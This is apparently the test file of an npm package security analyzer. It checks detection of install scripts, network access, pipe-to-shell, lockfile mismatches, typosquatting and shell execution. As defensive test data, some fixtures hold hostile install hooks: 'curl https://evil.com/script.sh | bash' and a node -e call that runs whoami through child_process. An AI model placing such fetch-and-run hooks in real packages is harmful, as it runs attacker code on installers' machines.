'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert');
const { analyzePackage, POPULAR_PACKAGES } = require('../src/analyzer');

describe('analyzePackage', () => {
  const emptyLockIndex = {
    indexByPath: new Map(),
    indexByName: new Map(),
    lockPresent: false,
    lockType: null,
  };

  const lockIndexWithPackage = {
    indexByPath: new Map(),
    indexByName: new Map([['test-pkg', { version: '1.0.0' }]]),
    lockPresent: true,
    lockType: 'npm-v2',
  };

  it('should detect install scripts', () => {
    const pkg = {
      name: 'test-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'echo hello' },
      dir: '/fake/path',
      relativePath: 'test-pkg',
    };

    const issues = analyzePackage(pkg, emptyLockIndex, {});
    const installIssue = issues.find(i => i.reason === 'install_script');
    
    assert.ok(installIssue, 'Should detect install script');
    assert.strictEqual(installIssue.severity, 'medium');
  });

  it('should detect network access in install scripts', () => {
    const pkg = {
      name: 'test-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'curl https://evil.com/script.sh | bash' },
      dir: '/fake/path',
      relativePath: 'test-pkg',
    };

    const issues = analyzePackage(pkg, emptyLockIndex, {});
    const networkIssue = issues.find(i => i.reason === 'network_access_script');
    const pipeIssue = issues.find(i => i.reason === 'pipe_to_shell');
    
    assert.ok(networkIssue, 'Should detect network access');
    assert.strictEqual(networkIssue.severity, 'high');
    assert.ok(pipeIssue, 'Should detect pipe to shell');
    assert.strictEqual(pipeIssue.severity, 'critical');
  });

  it('should detect extraneous packages', () => {
    const pkg = {
      name: 'unknown-pkg',
      version: '1.0.0',
      scripts: {},
      dir: '/fake/path',
      relativePath: 'unknown-pkg',
    };

    const issues = analyzePackage(pkg, lockIndexWithPackage, { checkLockfile: true });
    const extraneousIssue = issues.find(i => i.reason === 'extraneous_package');
    
    assert.ok(extraneousIssue, 'Should detect extraneous package');
    assert.strictEqual(extraneousIssue.severity, 'medium');
  });

  it('should detect version mismatch', () => {
    const pkg = {
      name: 'test-pkg',
      version: '2.0.0', // Different from lockfile
      scripts: {},
      dir: '/fake/path',
      relativePath: 'test-pkg',
    };

    const issues = analyzePackage(pkg, lockIndexWithPackage, { checkLockfile: true });
    const mismatchIssue = issues.find(i => i.reason === 'version_mismatch');
    
    assert.ok(mismatchIssue, 'Should detect version mismatch');
    assert.strictEqual(mismatchIssue.severity, 'critical');
  });

  it('should reduce severity for trusted packages', () => {
    const pkg = {
      name: 'esbuild',
      version: '1.0.0',
      scripts: { postinstall: 'node install.js' },
      dir: '/fake/path',
      relativePath: 'esbuild',
    };

    const config = {
      trustedPackages: ['esbuild'],
    };

    const issues = analyzePackage(pkg, emptyLockIndex, config);
    const installIssue = issues.find(i => i.reason === 'install_script');
    
    assert.ok(installIssue, 'Should still detect install script');
    assert.strictEqual(installIssue.severity, 'info', 'Should be info for trusted package');
  });

  it('should not flag matching versions', () => {
    const pkg = {
      name: 'test-pkg',
      version: '1.0.0',
      scripts: {},
      dir: '/fake/path',
      relativePath: 'test-pkg',
    };

    const issues = analyzePackage(pkg, lockIndexWithPackage, {});
    const mismatchIssue = issues.find(i => i.reason === 'version_mismatch');
    const extraneousIssue = issues.find(i => i.reason === 'extraneous_package');
    
    assert.ok(!mismatchIssue, 'Should not detect version mismatch');
    assert.ok(!extraneousIssue, 'Should not detect extraneous package');
  });
});

describe('typosquatting detection', () => {
  it('should have popular packages list', () => {
    assert.ok(POPULAR_PACKAGES.length > 0, 'Should have popular packages');
    assert.ok(POPULAR_PACKAGES.includes('lodash'), 'Should include lodash');
    assert.ok(POPULAR_PACKAGES.includes('express'), 'Should include express');
  });

  it('should detect typosquatting attempts when enabled', () => {
    const pkg = {
      name: 'lodahs', // Typo of lodash
      version: '1.0.0',
      scripts: {},
      dir: '/fake/path',
      relativePath: 'lodahs',
    };

    // Typosquatting is disabled by default
    const issuesWithout = analyzePackage(pkg, { lockPresent: false }, {});
    const typoIssueWithout = issuesWithout.find(i => i.reason === 'potential_typosquat');
    assert.ok(!typoIssueWithout, 'Should not detect typosquatting by default');

    // Enable typosquatting check
    const issuesWith = analyzePackage(pkg, { lockPresent: false }, { checkTyposquatting: true });
    const typoIssueWith = issuesWith.find(i => i.reason === 'potential_typosquat');
    
    assert.ok(typoIssueWith, 'Should detect typosquatting when enabled');
    assert.strictEqual(typoIssueWith.severity, 'high');
  });
});

describe('shell execution detection', () => {
  it('should detect bash -c patterns', () => {
    const pkg = {
      name: 'test-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'bash -c "echo hello"' },
      dir: '/fake/path',
      relativePath: 'test-pkg',
    };

    const issues = analyzePackage(pkg, { lockPresent: false }, {});
    const shellIssue = issues.find(i => i.reason === 'shell_execution');
    
    assert.ok(shellIssue, 'Should detect shell execution');
  });

  it('should detect node -e patterns', () => {
    const pkg = {
      name: 'test-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'node -e "require(\'child_process\').exec(\'whoami\')"' },
      dir: '/fake/path',
      relativePath: 'test-pkg',
    };

    const issues = analyzePackage(pkg, { lockPresent: false }, {});
    const codeExecIssue = issues.find(i => i.reason === 'code_execution');
    
    assert.ok(codeExecIssue, 'Should detect code execution');
  });
});
